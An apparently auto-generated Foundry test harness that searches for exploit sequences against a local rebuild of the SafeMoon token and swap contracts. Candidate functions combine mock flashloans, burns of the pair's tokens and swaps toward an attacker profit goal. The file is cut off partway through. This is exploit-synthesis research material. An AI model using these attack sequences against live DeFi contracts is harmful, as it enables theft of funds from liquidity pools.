// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {BuyBackAndBurnFeeCollector} from "./BuyBackAndBurnFeeCollector.sol";
import {FeeJarAdmin} from "./FeeJarAdmin.sol";
import {FeeJar} from "./FeeJar.sol";
import {FeeSetter} from "./FeeSetter.sol";
import {LpFeeCollector} from "./LpFeeCollector.sol";
import {SafeSwapTradeRouter} from "./SafeSwapTradeRouter.sol";
import {Safemoon} from "./Safemoon.sol";
import {SafeswapFactory} from "./SafeswapFactory.sol";
import {SafeswapPair} from "./SafeswapPair.sol";
import {SafeswapRouterProxy1} from "./SafeswapRouterProxy1.sol";
import {WETH} from "@utils/WETH.sol";

contract SafemoonTest is Test, BlockLoader {
    Safemoon safemoon;
    WETH weth;
    FeeJar feejar;
    FeeJarAdmin feeJarAdmin;
    FeeSetter feeSetter;
    BuyBackAndBurnFeeCollector buyBackAndBurnFeeCollector;
    LpFeeCollector lpFeeCollector;
    SafeswapPair pair;
    SafeswapFactory factory;
    SafeSwapTradeRouter tradeRouter;
    SafeswapRouterProxy1 router;
    AttackContract attackContract;
    address owner;
    address attacker;
    address safemoonAddr;
    address wethAddr;
    address feejarAddr;
    address feeJarAdminAddr;
    address feeSetterAddr;
    address buyBackAndBurnFeeCollectorAddr;
    address lpFeeCollectorAddr;
    address pairAddr;
    address factoryAddr;
    address tradeRouterAddr;
    address routerAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1680000871;
    uint112 reserve0pair = 0;
    uint112 reserve1pair = 0;
    uint32 blockTimestampLastpair = 0;
    uint256 kLastpair = 0;
    uint256 price0CumulativeLastpair = 0;
    uint256 price1CumulativeLastpair = 0;
    uint112 reserve0sfmoonUniswapv2Pair = 32912229748033645031;
    uint112 reserve1sfmoonUniswapv2Pair = 27464995549338281104177;
    uint32 blockTimestampLastsfmoonUniswapv2Pair = 1680000259;
    uint256 kLastsfmoonUniswapv2Pair =
        903810459486866707352442128303555486933588;
    uint256 price0CumulativeLastsfmoonUniswapv2Pair =
        59058603194915512913186809455369547161568248;
    uint256 price1CumulativeLastsfmoonUniswapv2Pair =
        65602384699141556534938484031371725281;
    uint256 totalSupplysafemoon = 1000000000000000000000;
    uint256 balanceOfsafemoonpair = 0;
    uint256 balanceOfsafemoonsfmoonUniswapv2Pair = 32912229748033645031;
    uint256 balanceOfsafemoonattacker = 0;
    uint256 totalSupplyweth = 3533691745814785013767043;
    uint256 balanceOfwethpair = 0;
    uint256 balanceOfwethsfmoonUniswapv2Pair = 27464995549338281104177;
    uint256 balanceOfwethattacker = 0;

    function setUp() public {
        owner = address(this);
        safemoon = new Safemoon();
        safemoonAddr = address(safemoon);
        weth = new WETH();
        wethAddr = address(weth);
        pair = new SafeswapPair();
        pairAddr = address(pair);
        feejar = new FeeJar();
        feejarAddr = address(feejar);
        feeJarAdmin = new FeeJarAdmin();
        feeJarAdminAddr = address(feeJarAdmin);
        feeSetter = new FeeSetter();
        feeSetterAddr = address(feeSetter);
        buyBackAndBurnFeeCollector = new BuyBackAndBurnFeeCollector();
        buyBackAndBurnFeeCollectorAddr = address(buyBackAndBurnFeeCollector);
        lpFeeCollector = new LpFeeCollector();
        lpFeeCollectorAddr = address(lpFeeCollector);
        factory = new SafeswapFactory();
        factoryAddr = address(factory);
        tradeRouter = new SafeSwapTradeRouter();
        tradeRouterAddr = address(tradeRouter);
        router = new SafeswapRouterProxy1();
        routerAddr = address(router);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        factory.initialize(address(0x0), address(0x0));
        factory.setRouter(address(router));
        factory.setImplementation(address(pair));
        factory.approveLiquidityPartner(address(safemoon));
        factory.approveLiquidityPartner(address(weth));
        feejar.initialize(
            address(feeJarAdmin),
            address(feeSetter),
            address(buyBackAndBurnFeeCollector),
            address(lpFeeCollector),
            address(factory),
            10000,
            1200,
            6800,
            2000
        );
        tradeRouter.initialize(address(feejar), address(router), 25, 10000);
        router.initialize(address(factory), address(weth));
        router.setRouterTrade(address(tradeRouter));
        safemoon.initialize();
        safemoon.initRouterAndPair(address(router));
        weth.approve(address(safemoon), 27457 ether);
        safemoon.afterDeploy();
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Safemoon Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(safemoon),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(safemoon),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Weth Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(weth),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(weth),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Feejar Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(feejar),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(feejar),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Feejaradmin Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(feeJarAdmin),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(feeJarAdmin),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Feesetter Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(feeSetter),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(feeSetter),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Buybackandburnfeecollector Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(buyBackAndBurnFeeCollector),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(buyBackAndBurnFeeCollector),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Lpfeecollector Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(lpFeeCollector),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(lpFeeCollector),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(pair),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(pair),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Traderouter Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(tradeRouter),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(tradeRouter),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(attacker),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(safemoon),
            address(attacker),
            safemoon.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return weth.balanceOf(attacker) >= 1e6 + balanceOfwethattacker;
    }

    function borrow_weth_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        weth.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_weth_owner(uint256 amount) internal eurus {
        weth.transfer(owner, amount);
    }

    function borrow_safemoon_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        safemoon.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_safemoon_owner(uint256 amount) internal eurus {
        safemoon.transfer(owner, amount);
    }

    function swap_pair_attacker_weth_safemoon(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        weth.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_safemoon_weth(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        safemoon.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function swap_safemoon_attacker_weth_safemoon(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(safemoon);
        uint256 feeAmount = tradeRouter.getSwapFees(amount, path);
        weth.approve(address(safemoon.uniswapV2Router()), amount);
        SafeSwapTradeRouter.Trade memory trade = SafeSwapTradeRouter.Trade({
            amountIn: amount,
            amountOut: 0,
            path: path,
            to: payable(address(attacker)),
            deadline: block.timestamp
        });
        weth.transfer(address(tradeRouter), feeAmount);
        tradeRouter.swapExactTokensForTokensWithFeeAmount(trade);
    }

    function swap_safemoon_attacker_safemoon_weth(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        address[] memory path = new address[](2);
        path[0] = address(safemoon);
        path[1] = address(weth);
        uint256 feeAmount = tradeRouter.getSwapFees(amount, path);
        safemoon.approve(address(safemoon.uniswapV2Router()), amount);
        SafeSwapTradeRouter.Trade memory trade = SafeSwapTradeRouter.Trade({
            amountIn: amount,
            amountOut: 0,
            path: path,
            to: payable(address(attacker)),
            deadline: block.timestamp
        });
        weth.transfer(address(tradeRouter), feeAmount);
        tradeRouter.swapExactTokensForTokensWithFeeAmount(trade);
    }

    function burn_safemoon_pair(uint256 amount) internal eurus {
        safemoon.burn(safemoon.uniswapV2Pair(), amount);
        IUniswapV2Pair(safemoon.getPairAddr()).sync();
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt5 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        payback_weth_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_weth_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_weth_safemoon(amt2, amt3);
        swap_pair_attacker_safemoon_weth(amt4, amt5);
        payback_weth_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_safemoon_weth(amt4, amt5);
        payback_weth_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        payback_weth_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt5 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        payback_weth_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_weth_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_weth_safemoon(amt2, amt3);
        swap_safemoon_attacker_safemoon_weth(amt4, amt5);
        payback_weth_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        payback_weth_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt5 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        payback_weth_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_safemoon_weth(amt4, amt5);
        payback_weth_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_safemoon_attacker_safemoon_weth(amt5, amt6);
        payback_weth_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt5 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        payback_weth_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_weth_owner(amt0);
        swap_safemoon_attacker_weth_safemoon(amt1, amt2);
        swap_safemoon_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_safemoon_weth(amt5, amt6);
        payback_weth_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt5 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        payback_safemoon_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_safemoon_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_safemoon_weth(amt2, amt3);
        swap_pair_attacker_weth_safemoon(amt4, amt5);
        payback_safemoon_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_weth_safemoon(amt4, amt5);
        payback_safemoon_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        payback_safemoon_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand016(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt5 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        payback_safemoon_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand017(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_safemoon_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_safemoon_weth(amt2, amt3);
        swap_safemoon_attacker_weth_safemoon(amt4, amt5);
        payback_safemoon_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand018(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_pair_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        payback_safemoon_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand019(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt5 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        payback_safemoon_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand020(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt6 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_weth_safemoon(amt4, amt5);
        payback_safemoon_owner(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand021(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_pair_attacker_weth_safemoon(amt3, amt4);
        swap_safemoon_attacker_weth_safemoon(amt5, amt6);
        payback_safemoon_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand022(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt5 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        payback_safemoon_owner(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand023(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt7 >= amt0);
        borrow_safemoon_owner(amt0);
        swap_safemoon_attacker_safemoon_weth(amt1, amt2);
        swap_safemoon_attacker_weth_safemoon(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        payback_safemoon_owner(amt7);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand024(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        swap_pair_attacker_safemoon_weth(amt7, amt8);
        payback_weth_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand025(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_weth_safemoon(amt2, amt3);
        swap_pair_attacker_safemoon_weth(amt4, amt5);
        swap_pair_attacker_weth_safemoon(amt6, amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand026(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_safemoon_weth(amt4, amt5);
        swap_pair_attacker_weth_safemoon(amt6, amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand027(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        burn_safemoon_pair(amt5);
        swap_pair_attacker_weth_safemoon(amt6, amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand028(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        burn_safemoon_pair(amt7);
        swap_pair_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand029(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt11 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        swap_pair_attacker_safemoon_weth(amt7, amt8);
        swap_safemoon_attacker_safemoon_weth(amt9, amt10);
        payback_weth_owner(amt11);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand030(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt9 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        swap_pair_attacker_weth_safemoon(amt5, amt6);
        swap_safemoon_attacker_safemoon_weth(amt7, amt8);
        payback_weth_owner(amt9);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand031(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        burn_safemoon_pair(amt1);
        swap_pair_attacker_weth_safemoon(amt2, amt3);
        swap_pair_attacker_safemoon_weth(amt4, amt5);
        swap_pair_attacker_weth_safemoon(amt6, amt7);
        swap_safemoon_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand032(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        burn_safemoon_pair(amt3);
        swap_pair_attacker_safemoon_weth(amt4, amt5);
        swap_pair_attacker_weth_safemoon(amt6, amt7);
        swap_safemoon_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand033(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10
    ) public {
        vm.startPrank(attacker);
        vm.warp(blockTimestamp);
        vm.roll(26854757);
        vm.assume(amt10 >= amt0);
        borrow_weth_owner(amt0);
        swap_pair_attacker_weth_safemoon(amt1, amt2);
        swap_pair_attacker_safemoon_weth(amt3, amt4);
        burn_safemoon_pair(amt5);
        swap_pair_attacker_weth_safemoon(amt6, amt7);
        swap_safemoon_attacker_safemoon_weth(amt8, amt9);
        payback_weth_owner(amt10);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand034(
